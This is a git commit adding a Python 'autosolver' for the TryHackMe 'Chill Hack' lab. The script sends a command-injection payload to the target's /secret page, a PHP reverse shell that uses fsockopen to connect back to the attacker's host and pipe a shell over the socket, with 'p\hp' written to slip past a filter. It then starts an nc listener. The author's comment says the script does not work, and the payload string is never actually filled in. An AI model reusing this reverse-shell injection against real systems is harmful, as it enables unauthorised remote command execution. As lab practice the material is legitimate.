6c8fe4d7c984c3d47ee3c0f086514e84b94f43fa
GIH5 <128325272+GIH5@users.noreply.github.com>
2023-03-26 16:35:33 -0400

    Add files via upload

---
+++ Auto-Folder/Chill_Hack-autosolver.py
@@ -0,0 +1,28 @@
+#Made on Mar 20 2023
+#Created in python3
+#DOES NOT WORK. I WILL PICK IT WHEN I HAVE THE CHANCE
+#'Chill Hack' on tryhackme
+
+import requests as req
+import sys
+import os
+import socket
+
+FileName = sys.argv[0]
+host = sys.argv[1] #our host
+port = sys.argv[2] #our port
+tar = sys.argv[3] #our target
+
+def nc():
+    listen = f'nc -lnvp {port}'
+    os.system(listen)
+
+def main_function(): #executes the script below to establish the shell
+    print(f"starting {FileName}")
+    url = f'http://{tar}/secret'
+    payload = {"command": """p\hp -r '$sock=fsockopen("{host}", {port});`sh <&3 >&3 2>&3`;'"""}
+    post_data = req.post(url, data=payload)
+
+    nc()
+
+main_function()
